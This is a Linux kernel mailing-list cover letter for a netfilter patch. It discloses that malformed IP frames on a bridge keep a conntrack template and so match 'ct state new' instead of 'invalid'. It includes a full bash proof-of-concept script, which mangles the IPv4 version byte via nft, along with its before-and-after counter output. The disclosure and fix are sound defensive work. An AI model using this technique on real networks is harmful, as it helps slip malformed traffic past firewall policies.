Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.174
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795403453;
	b=MMgiv7aQkQY/9gxqAKnCaVGY1IWNrx1dvqlpLFf0vir+LEhykVyVKsC6dLY8G8moK+JJ
	 iHRF+nQ1Cn9rhlmshnETYg7JPgp1VEyhKSNl4e346bW66qAv0UNzqghYQfZeaj1nekzIl
	 qwdv51TO1Zmo2GaFyrlhLPq98Isne7YQ1xA1EjZXm4z8Jafpmivsp8gUUvlxzlvW6aW5t
	 k2KVk1wDOT0fEN42nhWVscOHhSnFeq/YHolRMZWUXgYwLZBmmUlQm9o08f/9PGOfAMEzK
	 /Q+JtBnhKoKOWUtfoj6TA/WXIX8Kat59htVY0+Vq2uCk64SBxv3Jmk4XxXvCjj2uUfw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795403453;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=DL9wQ9wUjDZBY1XykMKvmcvfPUdxrtmOQvmRvrKNPSA=;
	b=TDmzuqYWhjcfhwbi4uKEkFld40jk25RILcF5E1+EwRMjfj06gFVp7PODVjCUORCcwhQS
	 BwYolWEYAcPKNDaNCLlOHVXx47CME1LZGh3AB+JaHpl1O8F1qMNDC40xFPS2qdQGlbiO+
	 V0VHoCbvWiMeosegr0ElHv5It4xOyzyzczVprEMcnNbdBJFAf1Y2LOfhbes7GFtdUFh2B
	 mzS/A5AhWmPdK5/6fBCm7Le89IqnE7gANddXUTJG3oMr8NtpXfpQrRg6TTmNs7ZoNuyn5
	 ExeCgH8tyjJL7bMBrwR95VN4b43eDY/aJiVEgjn61HD/ow1BHGHW2QfmJ16OBxDXA/A==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b="NBNoOIZ/";
	arc=none smtp.remote-ip=209.85.215.174
Received: from mail-pg1-f174.google.com (mail-pg1-f174.google.com [209.85.215.174])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 32A50606A31E
	for <netfilter-devel@vger.kernel.org>; Mon, 23 Nov 2026 03:10:52 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 32A50606A31E
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=NBNoOIZ/
Received: by mail-pg1-f174.google.com with SMTP id 41be03b00d2f7-cc147d86bebso1425029a12.0
        for <netfilter-devel@vger.kernel.org>; Sun, 22 Nov 2026 19:10:52 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1795403452; x=1796008252; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DL9wQ9wUjDZBY1XykMKvmcvfPUdxrtmOQvmRvrKNPSA=;
        b=NBNoOIZ/iZZF+/WwSPS/GVpJoY9LGewJc6CZLitzYq5p4JxuHcbHs/8ZD0xjGZM8Fp
         Ysc4Lut7fnYencWsYQ85+LuvhXNbBegkxicOMm0U5UozTYw1Uz3L6+/fov08fX412x8v
         x9owm88w1DIQhpKRwRPTVTb7t5+uiuzzW+W8Z/tSgRNV8UlNmq4x796v18ophiu2cP3M
         jgCrQdOQVAZtiT0wjKBIt7b5AbASTcdXsDjl52QYyvWp1AvRBCk1OPzDIhaar34Pf6zL
         2u8rCh6HQqySF9bQpFW8tVxYNAMDL+je9YTJPe8h0XH2WtaSCFOOnYkR/gQOMNsXQcvh
         InjA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795403452; x=1796008252;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DL9wQ9wUjDZBY1XykMKvmcvfPUdxrtmOQvmRvrKNPSA=;
        b=PAKd6oor6X7AgdLpc/t19sNrMPRuX0KvPIjzzSHeY7NFPkveaX469g854HBktS8a9D
         BE911lAcKlqxsdzSXU5L3jOZISKKxKxnWfqYWPrhwgo7V9by8NTBr6te/nIOtA0GILQQ
         arLAXGGo8dlFIIqCWz2aWcbangmql63nlO7j2sK5C2anOrZrkP2FqwYSyWnPGFIk28Jn
         AJQxBvAlW1ZLkxjsjpLjv6K9T9kCZNRu7e9s0HXfZ5Rnu13O0TF7X+bndmWbgoKIFxRZ
         /KzXJftST4KSYfruzWLy482TedWEdWUXJrypwYMeAQ61Tc3bV7Rf3IXXvuRwOeIgpr1h
         cMAg==
X-Gm-Message-State: APuU4Z+p2ZkCo/8g0Xt49Lcsl5IpWooyqSNMN2JB1xjn+8N5sqPv2a/i
	l6C0KV+m75uSMoXZRa4wSN+j0CwDF6P2wA2moMqae7hrk+Cxej2ZcCMPC6hhhFxzFmYHbtXs/+3
	R64iyn7qh
X-Gm-Gg: AZFdTZd4D4Wy+rz5wTgFBegkrCtalC//UvDjxbv96wMwgTvw2APkJWHdssoy7xSAVdy
	OvYYRioqYBLRKKDBlKmzeTiR+0inxFdUo2+gZePgTGyAPTe5p9hg5eUJtr8ljqQcvwCxy5YS6No
	Zz3el5E9pIpE4RogE379Rwx8wpWnETjlfOs+Iq2lyE3gP+LofZvHiQyu5yFgquZ/FEVkPSuFCm6
	lJyYaPN5Ay7E73WtGEU+suZJmHRdZmGgtB6QFKokkcg2cSlO0LU1L1n6gyPan/9tHVJI5q9YzRp
	qLXMqobggmb9dT6+fVOHU9ayMG9gjubISL6XTWdfT4Q03E67v6WjembBL1beemMeeP0ajI/WlqO
	MPixUxiqCzITVUOE+Ilbhzso44BqWPF7oid/0uNXi+IuGOzwQ8Ag8Y+Q3uJC4ad9thna/vmpwau
	oLeen28zBgUDxSplvgtj9rcFgEMuC/+GESY6ajAng1pu7/VGKqjA2nfmtABh7g784cy9DLiL5gE
	HjIeYcJrREvL5CFxF5samG6e3FD4EPp/e61OfMWRcLsTXJhJDLuBNHJUnWFj7ns3dtK8T0HpzDY
	bnAwTiznynPJyfi8t9Iezr+sEKd0+SUOWVSgBtxL
X-Received: by 2002:a05:6a21:4c0c:b0:3e1:4e53:4e7f with SMTP id adf61e73a8af0-4014dd5d533mr6695784637.27.1795403452239;
        Sun, 22 Nov 2026 19:10:52 -0800 (PST)
Received: from enjou-Legion-Y7000P-2019 ([191.223.218.36])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8c87343fe6csm4826392b3a.37.2026.11.22.19.10.48
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 22 Nov 2026 19:10:51 -0800 (PST)
From: Ren Wei <weir@nebusec.ai>
To: netfilter-devel@vger.kernel.org,
	bridge@lists.linux.dev
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	razor@blackwall.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	vega@nebusec.ai,
	sashiko-bot@kernel.org,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: bridge: detach conntrack template on invalid IP frames
Date: Mon, 23 Nov 2026 11:11:00 +0800
Message-ID: <cover.1795348417.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Post: <mailto:netfilter-devel@vger.kernel.org>
List-Help: <mailto:netfilter-devel+help@vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netfilter-devel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in
net/bridge/netfilter/nf_conntrack_bridge.c where malformed IPv4 and IPv6
frames retain an attached conntrack template on early rejection paths in
nf_ct_bridge_pre().

This bug is tracked at: https://bugtracker.nebusec.ai/f/11085

Reachability & impact:
When a bridge policy assigns a conntrack zone before connection tracking
(for example via nftables `ct zone set` at raw priority -300), nftables
attaches a conntrack template with IP_CT_NEW to skb->_nfct. If an
incoming ETH_P_IP or ETH_P_IPV6 frame fails header pull, length
trimming, or header validation in nf_ct_bridge_pre(), nf_ct_bridge_pre()
returns NF_ACCEPT directly without passing the skb to nf_conntrack_in().

Because nft_ct_get_eval() evaluates NFT_CT_STATE before checking
nf_ct_is_template(ct), the retained IP_CT_NEW template causes malformed,
truncated, or wrong-version IP frames to match `ct state new` instead of
`ct state invalid`. Bridge policies that accept NEW traffic and intend to
drop INVALID traffic can consequently forward malformed frames.

Note on related nf-next work:
Florian Westphal's nf-next proposal "netfilter: conntrack: add and use
nf_ct_get_real()" (see link below) would prevent downstream consumers
such as nft_ct_get_eval() from classifying a retained template as NEW,
treating it as INVALID instead. Because nf_ct_get_real() is not in nf or
-stable kernels, and because nf_ct_bridge_pre() should not leave an
unconsumed template attached to skb->_nfct on parse failure (matching
nf_conntrack_in() and the default non-IP branch), releasing the template
in nf_ct_bridge_pre() remains necessary.
https://lore.kernel.org/netfilter-devel/20260923122741.30468-1-fw@strlen.de/

The attached reproducer (poc.sh) uses a netdev ingress rule on vethA to
rewrite the IPv4 version nibble from 0x45 to 0x65 (running as root in
our guest environment); an external or bridge peer can also inject
malformed frames directly over the wire without host privileges.

=== details below ===

Bug details:

In net/bridge/netfilter/nf_conntrack_bridge.c, nf_ct_bridge_pre() has
six early-return paths across the ETH_P_IP and ETH_P_IPV6 cases:
1. ETH_P_IP:
   - !pskb_may_pull(skb, sizeof(struct iphdr))
   - pskb_trim_rcsum(skb, len)
   - nf_ct_br_ip_check(skb)
2. ETH_P_IPV6:
   - !pskb_may_pull(skb, sizeof(struct ipv6hdr))
   - pskb_trim_rcsum(skb, len)
   - nf_ct_br_ipv6_check(skb)

Unlike the default non-IP branch (which calls nf_reset_ct(skb)) and
nf_conntrack_in() (which clears skb->_nfct = 0 and drops the template
reference on parse failure), all six IPv4/IPv6 rejection paths return
NF_ACCEPT with the template still attached to skb->_nfct.

The fix jumps all six paths to a shared `invalid:` label that calls
nf_reset_ct(skb) before returning NF_ACCEPT, dropping the template
reference and restoring skb->_nfct to 0 so that subsequent ct state
evaluation classifies the frame as INVALID.

Testing & Validation:
We validated both the baseline reproduction and the fix in an x86_64
QEMU guest (2 vCPUs, 2GB RAM, CONFIG_KASAN=y, CONFIG_UBSAN=y,
CONFIG_LOCKDEP=y, CONFIG_NF_CONNTRACK_BRIDGE=y) built from nf/main
(734bef548a96).

1. Pre-fix verification (unpatched nf/main):
   Running `bash /home/test_user/poc.sh`:
   - [control-no-template]: seen=1, invalid=1, newpkts=0, mangled=1
   - [template-retained]:   seen=1, invalid=0, newpkts=1, mangled=1

2. Post-fix verification (patched kernel):
   Running `bash /root/poc.sh`:
   - [control-no-template]: seen=1, invalid=1, newpkts=0, mangled=1
   - [template-retained]:   seen=1, invalid=1, newpkts=0, mangled=1

3. Extended regression testing (with `ct zone set 1` active):
   - IPv4 short header (< 20B), inflated tot_len, tot_len < ihl*4,
     low IHL (0x44), wrong version (0x65): all matched invalid=1, new=0.
   - IPv6 short header (< 40B), wrong version (0x40), inflated
     payload_len: all matched invalid=1, new=0.
   - Non-IP ARP frame: matched untracked=1, invalid=0, new=0.
   - Normal IPv4 ping and IPv6 ping6 across bridge (between init_net
     and netns nsB): both succeeded with invalid=0, new=1,
     established=1.
   - 1000-packet malformed IPv4/IPv6 stress test: invalid=1000, new=0,
     with zero KASAN, UBSAN, Lockdep, or refcount warnings in dmesg.

4. Style & patch checks:
   - git diff --check HEAD~1: 0 issues
   - git apply --check on nf/main: clean
   - scripts/checkpatch.pl --strict: 0 errors, 1 warning (consecutive
     Reported-by lines where VEGA has no separate public report URL)

Reproducer:

    bash poc.sh

=== BEGIN poc.sh ===
#!/bin/bash
set -euo pipefail

PATH=/usr/sbin:/sbin:/usr/bin:/bin

TABLE=brtest
BR=br0
PORT_A=vethA
PORT_B=vethB
END_A=peerA
END_B=peerB
TARGET_IP=10.0.0.99
SOURCE_IP=10.0.0.1/24

cleanup() {
	nft flush ruleset >/dev/null 2>&1 || true
	ip route del "$TARGET_IP/32" dev "$END_A" >/dev/null 2>&1 || true
	ip neigh del "$TARGET_IP" dev "$END_A" >/dev/null 2>&1 || true
	ip link del "$PORT_A" >/dev/null 2>&1 || true
	ip link del "$PORT_B" >/dev/null 2>&1 || true
	ip link del "$BR" >/dev/null 2>&1 || true
}

need_root() {
	if [ "$(id -u)" -ne 0 ]; then
		echo "run as root, or use --userns from an unprivileged account" >&2
		exit 1
	fi
}

mac_of() {
	ip -o link show dev "$1" | awk '{for (i = 1; i <= NF; i++) if ($i == "link/ether") print $(i + 1)}'
}

setup_topology() {
	ip link add "$BR" type bridge
	ip link add "$PORT_A" type veth peer name "$END_A"
	ip link add "$PORT_B" type veth peer name "$END_B"
	ip link set "$PORT_A" master "$BR"
	ip link set "$PORT_B" master "$BR"

	for dev in "$BR" "$PORT_A" "$PORT_B" "$END_A" "$END_B"; do
		ip link set "$dev" up
	done

	ip addr add "$SOURCE_IP" dev "$END_A"
	ip route add "$TARGET_IP/32" dev "$END_A"
	ip neigh add "$TARGET_IP" lladdr "$(mac_of "$END_B")" dev "$END_A" nud permanent
}

setup_mangler() {
	nft add table netdev m
	nft add counter netdev m mangled
	nft 'add chain netdev m ingress_vethA { type filter hook ingress device "vethA" priority 0; policy accept; }'
	nft add rule netdev m ingress_vethA meta protocol ip counter name mangled @nh,0,8 set 0x65
}

setup_observer() {
	nft add table bridge "$TABLE"
	for c in seen invalid newpkts established untracked other; do
		nft add counter bridge "$TABLE" "$c"
	done

	nft 'add chain bridge brtest observe { type filter hook prerouting priority 0; policy accept; }'
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip counter name seen
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state invalid counter name invalid accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state untracked counter name untracked accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state new counter name newpkts accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip ct state established,related counter name established accept
	nft add rule bridge "$TABLE" observe iifname "$PORT_A" meta protocol ip counter name other
}

add_zone_template_rule() {
	nft 'add chain bridge brtest ctpre { type filter hook prerouting priority -300; policy accept; }'
	nft add rule bridge "$TABLE" ctpre iifname "$PORT_A" meta protocol ip ct zone set 1
}

reset_phase_counters() {
	nft reset counters table bridge "$TABLE"
	nft reset counters table netdev m
}

print_phase_counters() {
	echo "bridge counters:"
	nft list counters table bridge "$TABLE"
	echo "mangle counters:"
	nft list counters table netdev m
}

run_phase() {
	local label=$1

	echo "[$label] sending one ping after mangling the first IPv4 header byte to 0x65"
	ping -I "$END_A" -c 1 -W 1 "$TARGET_IP" >/dev/null || true
	echo "[$label] results"
	print_phase_counters
}

main_inner() {
	need_root
	trap cleanup EXIT
	cleanup

	setup_topology
	setup_observer
	setup_mangler

	run_phase "control-no-template"

	add_zone_template_rule
	reset_phase_counters
	run_phase "template-retained"
}

if [ "${1:-}" = "--userns" ]; then
	exec unshare -Urnm -- "$0" --inner
fi

if [ "${1:-}" = "--inner" ]; then
	shift
fi

main_inner "$@"
=== END poc.sh ===

=== BEGIN pre-fix output ===
[control-no-template] sending one ping after mangling the first IPv4 header byte to 0x65
[control-no-template] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 1 bytes 84
	}
	counter newpkts {
		packets 0 bytes 0
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
[template-retained] sending one ping after mangling the first IPv4 header byte to 0x65
[template-retained] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 0 bytes 0
	}
	counter newpkts {
		packets 1 bytes 84
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
=== END pre-fix output ===

=== BEGIN post-fix output ===
[control-no-template] sending one ping after mangling the first IPv4 header byte to 0x65
[control-no-template] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 1 bytes 84
	}
	counter newpkts {
		packets 0 bytes 0
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
[template-retained] sending one ping after mangling the first IPv4 header byte to 0x65
[template-retained] results
bridge counters:
table bridge brtest {
	counter seen {
		packets 1 bytes 84
	}
	counter invalid {
		packets 1 bytes 84
	}
	counter newpkts {
		packets 0 bytes 0
	}
	counter established {
		packets 0 bytes 0
	}
	counter untracked {
		packets 0 bytes 0
	}
	counter other {
		packets 0 bytes 0
	}
}
mangle counters:
table netdev m {
	counter mangled {
		packets 1 bytes 84
	}
}
=== END post-fix output ===

Best regards,
Luxiao Xu

Luxiao Xu (1):
  netfilter: bridge: detach conntrack template on invalid IP frames

 net/bridge/netfilter/nf_conntrack_bridge.c | 16 ++++++++++------
 1 file changed, 10 insertions(+), 6 deletions(-)

-- 
2.43.0

